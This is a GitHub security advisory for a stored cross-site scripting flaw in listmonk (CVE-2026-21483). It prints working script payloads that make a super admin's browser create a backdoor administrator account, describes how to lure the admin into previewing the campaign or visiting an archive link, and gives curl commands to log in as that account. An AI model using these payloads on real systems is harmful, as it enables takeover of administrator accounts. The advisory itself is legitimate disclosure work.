# [M] listmonk Vulnerable to Stored XSS Leading to Admin Account Takeover

## Summary
Severity: Medium
Advisory: GHSA-jmr4-p576-v565
CVE: CVE-2026-21483
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N/E:P (CVSS_V4)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-jmr4-p576-v565
Type: github-advisory

## Affected
- Go: `github.com/knadh/listmonk` — affected >=1.1.1 <6.0.0
- Go: `github.com/knadh/listmonk` — affected >=0 <1.1.1-0.20251231125615-74dc5a01cfbb

## Details
## Security Advisory: Stored XSS Leading to Admin Account Takeover

**Affected Versions:** ≤ 5.1.0  
**Vulnerability Type:** CWE-79: Stored Cross-Site Scripting  

---

## Summary

A lower-privileged user with campaign management permissions can inject malicious JavaScript into campaigns or templates. When a higher-privileged user (Super Admin) views or previews this content, the XSS executes in their browser context, allowing the attacker to perform privileged actions such as creating backdoor admin accounts.

The attack can be weaponized via the **public archive feature**, where victims simply need to visit a link - no preview click required.

---

## Required Attacker Permissions

```
campaigns:manage    - Create/edit campaigns
campaigns:get       - View campaigns  
lists:get_all       - Access lists
templates:get       - Access templates
```

**Note:** These are common permissions for content managers who are not full admins.

---

## Attack Vectors

### Vector 1: Raw HTML (Direct Script Tag)

```html
<script>
fetch('/api/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: '{"username":"backdoor","email":"backdoor@evil.com","name":"Backdoor","password":"Hacked123","type":"user","status":"enabled","userRoleId":1,"user_role_id":1}'
});
</script>
```

### Vector 2: Go Template `Safe` Function

```
{{ `<script>fetch('/api/users',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:'{"username":"backdoor","email":"backdoor@evil.com","name":"Backdoor","password":"Hacked123","type":"user","status":"enabled","userRoleId":1,"user_role_id":1}'});</script>` | Safe }}
```

---

## Attack Scenarios

### Scenario 1: Campaign Preview Attack

1. Attacker creates campaign with XSS payload
2. Request is made to super admin: *"Please review my newsletter draft"*
3. Super admin opens campaign and clicks **Preview**
4. XSS executes → Backdoor admin account created
5. Attacker logs in with `backdoor` / `Hacked123`

### Scenario 2: Archive Link Attack (No Click Required)

1. Attacker creates campaign with XSS payload
2. Attacker enables **Archive** for the campaign
3. Attacker shares archive link: `http://localhost:9000/archive/{uuid}`
4. Super admin visits the link (no preview click needed!)
5. XSS executes automatically → Account takeover

---

## Proof of Concept

### Step 1: Create Malicious Campaign

As lower-privileged user, create campaign with body:
```html
<script>
fetch('/api/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    username: 'backdoor',
    email: 'backdoor@evil.com', 
    name: 'Backdoor Admin',
    password: 'Hacked123',
    type: 'user',
    status: 'enabled',
    userRoleId: 1,
    user_role_id: 1
  })
});
</script>
```

### Step 2: Enable Archive (Optional - for link-based attack)

1. Edit campaign settings
2. Enable "Archive"
3. Copy archive URL: `http://localhost:9000/archive/{campaign-uuid}`

### Step 3: Trigger Execution

**Option A - Preview:**
- Send campaign to super admin for "review"
- Super admin previews → XSS fires

**Option B - Archive Link:**
- Share archive URL with super admin
- Super admin visits link → XSS fires automatically

### Step 4: Verify Takeover

```bash
# Login as backdoor admin
curl -X POST "http://localhost:9000/admin/login" \
  -d "username=backdoor&password=Hacked123" \
  -c cookies.txt -L

# Verify super admin access
curl -b cookies.txt "http://localhost:9000/api/users"
```

---

## Evidence Screenshots

> **[Screenshot 1: Lower-privileged user creating malicious campaign]**
<img width="1892" height="781" alt="Screenshot 2025-12-27 170259" src="https://github.com/user-attachments/assets/b9af26bf-0c5b-4667-ba9a-eea774156d0b" />

> **[Screenshot 2: Super admin previewing campaign]**
<img width="1686" height="709" alt="image" src="https://github.com/user-attachments/assets/4ca3d5ff-0cd9-4f22-bca0-e26e13c6b1c7" />

> **[Screenshot 3: Backdoor user successfully created]**
<img width="1370" height="469" alt="Screenshot 2025-12-27 170413" src="https://github.com/user-attachments/assets/18135128-f5af-4023-9aa7-8662a1405ed2" />

---

## Impact

| Action | Possible via XSS |
|--------|-----------------|
| Create backdoor admin | ✅ Yes |
| Export all subscribers | ✅ Yes |
| Modify SMTP settings | ✅ Yes |
| Delete all campaigns | ✅ Yes |
| Access API keys/secrets | ✅ Yes |

---

## Affected Components

| Component | XSS Works? | Method |
|-----------|-----------|--------|
| Campaign body (Raw HTML) | ✅ Yes | Direct `<script>` tag |
| Campaign body (Template) | ✅ Yes | `{{ \` \` \| Safe }}` |
| Template body | ✅ Yes | Both methods |
| Campaign archive | ✅ Yes | Automatic execution on visit |

---

## References
- https://github.com/knadh/listmonk/security/advisories/GHSA-jmr4-p576-v565
- https://nvd.nist.gov/vuln/detail/CVE-2026-21483
- https://github.com/knadh/listmonk/commit/74dc5a01cfbb12cf218cb33ddad8410c53e2e915
- https://github.com/knadh/listmonk
- https://github.com/knadh/listmonk/releases/tag/v6.0.0
